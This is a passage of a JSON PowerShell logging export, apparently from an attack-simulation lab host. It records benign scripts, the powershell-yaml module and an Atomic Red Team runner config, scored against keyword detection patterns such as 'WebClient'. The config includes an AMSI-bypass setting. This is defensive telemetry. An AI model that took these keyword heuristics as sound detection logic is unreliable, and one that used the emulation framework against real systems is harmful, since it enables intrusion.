      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\nenum SerializationOptions {\n    None = 0\n    Roundtrip = 1\n    DisableAliases = 2\n    EmitDefaults = 4\n    JsonCompatible = 8\n    DefaultToStaticType = 16\n    WithIndentedSequences = 32\n}\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n$assemblies = Join-Path $here \"Load-Assemblies.ps1\"\n$infinityRegex = [regex]::new('^[-+]?(\\.inf|\\.Inf|\\.INF)$', \"Compiled, CultureInvariant\");\n\nif (Test-Path $assemblies) {\n    . $here\\Load-Assemblies.ps1\n}\n\nfunction Get-YamlDocuments {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [string]$Yaml,\n        [switch]$UseMergingParser=$false\n    )\n    PROCESS {\n        $stringReader = new-object System.IO.StringReader($Yaml)\n        $parser = New-Object \"YamlDotNet.Core.Parser\" $stringReader\n        if($UseMergingParser) {\n            $parser = New-Object \"YamlDotNet.Core.MergingParser\" $parser\n        }\n\n        $yamlStream = New-Object \"YamlDotNet.RepresentationModel.YamlStream\"\n        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)\n\n        $stringReader.Close()\n\n        return $yamlStream\n    }\n}\n\nfunction Convert-ValueToProperType {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Object]$Node\n    )\n    PROCESS {\n        if (!($Node.Value -is [string])) {\n            return $Node\n        }\n        \n        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {\n            switch($Node.Tag) {\n                \"tag:yaml.org,2002:str\" {\n                    return $Node.Value\n                }\n                \"tag:yaml.org,2002:null\" {\n                    return $null\n                }\n                \"tag:yaml.org,2002:bool\" {\n                    $parsedValue = $false\n                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as boolean\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:int\" {\n                    $parsedValue = 0\n                    if ($node.Value.Length -gt 2) {\n                        switch ($node.Value.Substring(0, 2)) {\n                            \"0o\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)\n                            }\n                            \"0x\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)\n                            }\n                            default {\n                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                                    Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                                }\n                            }\n                        }\n                    } else {\n                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                            Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                        }\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:float\" {\n                    $parsedValue = 0.0\n                    if ($infinityRegex.Matches($Node.Value)) {\n                        $prefix = $Node.Value.Substring(0, 1)\n                        switch ($prefix) {\n                            \"-\" {\n                                return [double]::NegativeInfinity\n                            }\n                            default {\n                                # Prefix is either missing or is a +\n                                return [double]::PositiveInfinity\n                            }\n                        }\n                    }\n                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as double\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:timestamp\" {\n                    # From the YAML spec: http://yaml.org/type/timestamp.html\n                    [DateTime]$parsedValue = [DateTime]::MinValue\n                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)\n                    $tss = $ts.ToString(\"o\")\n                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as DateTime\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain')\n        {\n            $types = @([int], [long], [double], [boolean], [decimal])\n            foreach($i in $types){\n                $parsedValue = New-Object -TypeName $i.FullName\n                if ($i.IsAssignableFrom([boolean])){\n                    $result = $i::TryParse($Node,[ref]$parsedValue) \n                } else {\n                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)\n                }\n                if( $result ) {\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {\n            return $null\n        }\n\n        return $Node.Value\n    }\n}\n\nfunction Convert-YamlMappingToHashtable {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,\n        [switch] $Ordered\n    )\n    PROCESS {\n        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }\n        foreach($i in $Node.Children.Keys) {\n            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\nfunction Convert-YamlSequenceToArray {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,\n        [switch]$Ordered\n    )\n    PROCESS {\n        $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n        foreach($i in $Node.Children){\n            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))\n        }\n        return ,$ret\n    }\n}\n\nfunction Convert-YamlDocumentToPSObject {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [System.Object]$Node, \n        [switch]$Ordered\n    )\n    PROCESS {\n        switch($Node.GetType().FullName){\n            \"YamlDotNet.RepresentationModel.YamlMappingNode\"{\n                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlSequenceNode\" {\n                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlScalarNode\" {\n                return (Convert-ValueToProperType $Node)\n            }\n        }\n    }\n}\n\nfunction Convert-HashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [hashtable]$Data\n    )\n    foreach($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-OrderedHashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Collections.Specialized.OrderedDictionary] $Data\n    )\n    foreach ($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-ListToGenericList {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [array]$Data=@()\n    )\n    $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    for($i=0; $i -lt $Data.Count; $i++) {\n        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))\n    }\n    return ,$ret\n}\n\nfunction Convert-PSCustomObjectToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [PSCustomObject]$Data\n    )\n    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')\n    foreach ($i in $Data.psobject.properties) {\n        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value\n    }\n    return $ret\n}\n\nfunction Convert-PSObjectToGenericObject {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [System.Object]$Data\n    )\n\n    if ($null -eq $data) {\n        return $data\n    }\n\n    $dataType = $data.GetType()\n    if ($data -isnot [System.Object]) {\n        return $data -as $dataType\n    }\n\n    if ($dataType.FullName -eq \"System.Management.Automation.PSCustomObject\") {\n        return Convert-PSCustomObjectToDictionary $data\n    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){\n        return Convert-OrderedHashtableToDictionary $data\n    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){\n        return Convert-HashtableToDictionary $data\n    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {\n        return Convert-ListToGenericList $data\n    }\n    return $data -as $dataType\n}\n\nfunction ConvertFrom-Yaml {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]\n        [string]$Yaml,\n        [switch]$AllDocuments=$false,\n        [switch]$Ordered,\n        [switch]$UseMergingParser=$false\n    )\n\n    BEGIN {\n        $d = \"\"\n    }\n    PROCESS {\n        if($Yaml -is [string]) {\n            $d += $Yaml + \"`n\"\n        }\n    }\n\n    END {\n        if($d -eq \"\"){\n            return\n        }\n        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser\n        if (!$documents.Count) {\n            return\n        }\n        if($documents.Count -eq 1){\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        if(!$AllDocuments) {\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        $ret = @()\n        foreach($i in $documents) {\n            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\n$stringQuotingEmitterSource = @\"\nusing System;\nusing System.Text.RegularExpressions;\nusing YamlDotNet;\nusing YamlDotNet.Core;\nusing YamlDotNet.Serialization;\nusing YamlDotNet.Serialization.EventEmitters;\npublic class StringQuotingEmitter: ChainedEventEmitter {\n    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356\n    private static Regex quotedRegex = new Regex(@`\"^(\\~|null|true|false|on|off|yes|no|y|n|[-+]?(\\.[0-9]+|[0-9]+(\\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\\.inf))?$`\", RegexOptions.Compiled | RegexOptions.IgnoreCase);\n    public StringQuotingEmitter(IEventEmitter next): base(next) {}\n\n    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {\n        var typeCode = eventInfo.Source.Value != null\n        ? Type.GetTypeCode(eventInfo.Source.Type)\n        : TypeCode.Empty;\n\n        switch (typeCode) {\n            case TypeCode.Char:\n                if (Char.IsDigit((char)eventInfo.Source.Value)) {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                }\n                break;\n            case TypeCode.String:\n                var val = eventInfo.Source.Value.ToString();\n                if (quotedRegex.IsMatch(val))\n                {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                } else if (val.IndexOf('\\n') > -1) {\n                    eventInfo.Style = ScalarStyle.Literal;\n                }\n                break;\n        }\n\n        base.Emit(eventInfo, emitter);\n    }\n\n    public static SerializerBuilder Add(SerializerBuilder builder) {\n        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));\n    }\n}\n\"@\n\nif (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {\n    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)\n    if ($PSVersionTable.PSEdition -eq \"Core\") {\n        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions \"-nowarn:1701\"\n    } else {\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp\n    }\n}\n\nfunction Get-Serializer {\n    Param(\n        [Parameter(Mandatory=$true)][SerializationOptions]$Options\n    )\n    \n    $builder = New-Object \"YamlDotNet.Serialization.SerializerBuilder\"\n    \n    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {\n        $builder = $builder.EnsureRoundtrip()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {\n        $builder = $builder.DisableAliases()\n    }\n    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {\n        $builder = $builder.EmitDefaults()\n    }\n    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {\n        $builder = $builder.JsonCompatible()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {\n        $builder = $builder.WithTypeResolver((New-Object \"YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver\"))\n    }\n    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {\n        $builder = $builder.WithIndentedSequences()\n    }\n    $builder = [StringQuotingEmitter]::Add($builder)\n    return $builder.Build()\n}\n\nfunction ConvertTo-Yaml {\n    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]\n    Param(\n        [Parameter(ValueFromPipeline = $true, Position=0)]\n        [System.Object]$Data,\n\n        [string]$OutFile,\n\n        [Parameter(ParameterSetName = 'Options')]\n        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,\n\n        [Parameter(ParameterSetName = 'NoOptions')]\n        [switch]$JsonCompatible,\n        \n        [switch]$KeepArray,\n\n        [switch]$Force\n    )\n    BEGIN {\n        $d = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    }\n    PROCESS {\n        if($data -is [System.Object]) {\n            $d.Add($data)\n        }\n    }\n    END {\n        if ($d -eq $null -or $d.Count -eq 0) {\n            return\n        }\n        if ($d.Count -eq 1 -and !($KeepArray)) {\n            $d = $d[0]\n        }\n        $norm = Convert-PSObjectToGenericObject $d\n        if ($OutFile) {\n            $parent = Split-Path $OutFile\n            if (!(Test-Path $parent)) {\n                Throw \"Parent folder for specified path does not exist\"\n            }\n            if ((Test-Path $OutFile) -and !$Force) {\n                Throw \"Target file already exists. Use -Force to overwrite.\"\n            }\n            $wrt = New-Object \"System.IO.StreamWriter\" $OutFile\n        } else {\n            $wrt = New-Object \"System.IO.StringWriter\"\n        }\n    \n        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {\n            $Options = 0\n            if ($JsonCompatible) {\n                # No indent options :~(\n                $Options = [SerializationOptions]::JsonCompatible\n            }\n        }\n\n        try {\n            $serializer = Get-Serializer $Options\n            $serializer.Serialize($wrt, $norm)\n        }\n        catch{\n            $_\n        }\n        finally {\n            $wrt.Close()\n        }\n        if ($OutFile) {\n            return\n        } else {\n            return $wrt.ToString()\n        }\n    }\n}\n\nNew-Alias -Name cfy -Value ConvertFrom-Yaml\nNew-Alias -Name cty -Value ConvertTo-Yaml\n\nExport-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.0951522+00:00",
      "event_id": 35711035,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 5396,
      "full_command": "\n$artConfig = [PSCustomObject]@{\n\n  # [optional] These two configs are calculated programatically, you probably don't need to change them\n  basehostname               = $((hostname | Select-String -Pattern \"(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$\").Matches.Groups[1].value)\n  OS                         = $( if ($IsLinux) { \"linux\" } elseif ($IsMacOS) { \"macos\" } else { \"windows\" })\n\n  # [optional(if using default install paths)] Paths to your Atomic Red Team \"atomics\" folder and your \"invoke-atomicredteam\" folder\n  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"/AtomicRedTeam/invoke-atomicredteam\" # this is the default install path so you probably don't need to change this\n  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"AtomicRedTeam/atomics\" # this is the default install path so you probably don't need to change this\n  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })   \"PrivateAtomics/atomics\" # if you aren't providing your own private atomics that are custom written by you, just leave this as is\n\n  # [ Optional ] The user that will be running each atomic test\n  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { \"$env:USERDOMAIN\\$env:USERNAME\" }) # example \"corp\\atomicrunner\"\n\n  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory\n  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example \"C:\\Users\\atomicrunner\"\n\n  # [optional]\n  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete\n  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner\n  scheduleFileName           = \"AtomicRunnerSchedule.csv\"\n\n  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger\n  LoggingModule              = ''\n\n  # [optional] Syslog configuration, default execution logs will be sent to this server:port\n  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\\\)\n  syslogPort                 = 514\n  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS\n\n  verbose                    = $true; # set to true for more log output\n\n  # [optional] logfile filename configs\n  logFolder                  = \"AtomicRunner-Logs\"\n  timeLocal                  = (Get-Date(get-date) -uformat \"%Y-%m-%d\").ToString()\n  logFileName                = \"$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv\"\n\n  # amsi bypass script block (applies to Windows only)\n  absb                       = $null\n\n  # AtomicRunnerService install directory\n  ServiceInstallDir                 = \"${ENV:windir}\\System32\"\n\n}\n\n# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values\n$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent\n$pathToPrivateConfig = Join-Path $root \"privateConfig.ps1\"\nif (Test-Path ($pathToPrivateConfig)) {\n  if ($IsLinux -or $IsMacOS) {\n    chmod +x $pathToPrivateConfig\n  }\n  & ($pathToPrivateConfig)\n}\n\n#####################################################################################\n# All of the configs below are calculated using the script block in the \"Value\" field.\n# This way, when you change the 'basePath' everything else is updated.\n# You should probably leave all of the stuff below alone.\n#####################################################################################\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"runnerFolder\"\n  Value       = { Join-Path $artConfig.basePath \"AtomicRunner\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"atomicLogsPath\"\n  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"scheduleFile\"\n  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"credFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"psc_$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"execLogPath\"\n  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"stopFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"stop.txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"logFile\"\n  Value       = { Join-Path $artConfig.atomicLogsPath \"log-$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.8750828+00:00",
      "event_id": 35711020,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 16921,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\nenum SerializationOptions {\n    None = 0\n    Roundtrip = 1\n    DisableAliases = 2\n    EmitDefaults = 4\n    JsonCompatible = 8\n    DefaultToStaticType = 16\n    WithIndentedSequences = 32\n}\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n$assemblies = Join-Path $here \"Load-Assemblies.ps1\"\n$infinityRegex = [regex]::new('^[-+]?(\\.inf|\\.Inf|\\.INF)$', \"Compiled, CultureInvariant\");\n\nif (Test-Path $assemblies) {\n    . $here\\Load-Assemblies.ps1\n}\n\nfunction Get-YamlDocuments {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [string]$Yaml,\n        [switch]$UseMergingParser=$false\n    )\n    PROCESS {\n        $stringReader = new-object System.IO.StringReader($Yaml)\n        $parser = New-Object \"YamlDotNet.Core.Parser\" $stringReader\n        if($UseMergingParser) {\n            $parser = New-Object \"YamlDotNet.Core.MergingParser\" $parser\n        }\n\n        $yamlStream = New-Object \"YamlDotNet.RepresentationModel.YamlStream\"\n        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)\n\n        $stringReader.Close()\n\n        return $yamlStream\n    }\n}\n\nfunction Convert-ValueToProperType {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Object]$Node\n    )\n    PROCESS {\n        if (!($Node.Value -is [string])) {\n            return $Node\n        }\n        \n        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {\n            switch($Node.Tag) {\n                \"tag:yaml.org,2002:str\" {\n                    return $Node.Value\n                }\n                \"tag:yaml.org,2002:null\" {\n                    return $null\n                }\n                \"tag:yaml.org,2002:bool\" {\n                    $parsedValue = $false\n                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as boolean\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:int\" {\n                    $parsedValue = 0\n                    if ($node.Value.Length -gt 2) {\n                        switch ($node.Value.Substring(0, 2)) {\n                            \"0o\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)\n                            }\n                            \"0x\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)\n                            }\n                            default {\n                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                                    Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                                }\n                            }\n                        }\n                    } else {\n                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                            Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                        }\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:float\" {\n                    $parsedValue = 0.0\n                    if ($infinityRegex.Matches($Node.Value)) {\n                        $prefix = $Node.Value.Substring(0, 1)\n                        switch ($prefix) {\n                            \"-\" {\n                                return [double]::NegativeInfinity\n                            }\n                            default {\n                                # Prefix is either missing or is a +\n                                return [double]::PositiveInfinity\n                            }\n                        }\n                    }\n                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as double\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:timestamp\" {\n                    # From the YAML spec: http://yaml.org/type/timestamp.html\n                    [DateTime]$parsedValue = [DateTime]::MinValue\n                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)\n                    $tss = $ts.ToString(\"o\")\n                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as DateTime\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain')\n        {\n            $types = @([int], [long], [double], [boolean], [decimal])\n            foreach($i in $types){\n                $parsedValue = New-Object -TypeName $i.FullName\n                if ($i.IsAssignableFrom([boolean])){\n                    $result = $i::TryParse($Node,[ref]$parsedValue) \n                } else {\n                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)\n                }\n                if( $result ) {\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {\n            return $null\n        }\n\n        return $Node.Value\n    }\n}\n\nfunction Convert-YamlMappingToHashtable {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,\n        [switch] $Ordered\n    )\n    PROCESS {\n        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }\n        foreach($i in $Node.Children.Keys) {\n            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\nfunction Convert-YamlSequenceToArray {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,\n        [switch]$Ordered\n    )\n    PROCESS {\n        $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n        foreach($i in $Node.Children){\n            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))\n        }\n        return ,$ret\n    }\n}\n\nfunction Convert-YamlDocumentToPSObject {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [System.Object]$Node, \n        [switch]$Ordered\n    )\n    PROCESS {\n        switch($Node.GetType().FullName){\n            \"YamlDotNet.RepresentationModel.YamlMappingNode\"{\n                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlSequenceNode\" {\n                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlScalarNode\" {\n                return (Convert-ValueToProperType $Node)\n            }\n        }\n    }\n}\n\nfunction Convert-HashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [hashtable]$Data\n    )\n    foreach($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-OrderedHashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Collections.Specialized.OrderedDictionary] $Data\n    )\n    foreach ($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-ListToGenericList {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [array]$Data=@()\n    )\n    $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    for($i=0; $i -lt $Data.Count; $i++) {\n        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))\n    }\n    return ,$ret\n}\n\nfunction Convert-PSCustomObjectToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [PSCustomObject]$Data\n    )\n    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')\n    foreach ($i in $Data.psobject.properties) {\n        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value\n    }\n    return $ret\n}\n\nfunction Convert-PSObjectToGenericObject {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [System.Object]$Data\n    )\n\n    if ($null -eq $data) {\n        return $data\n    }\n\n    $dataType = 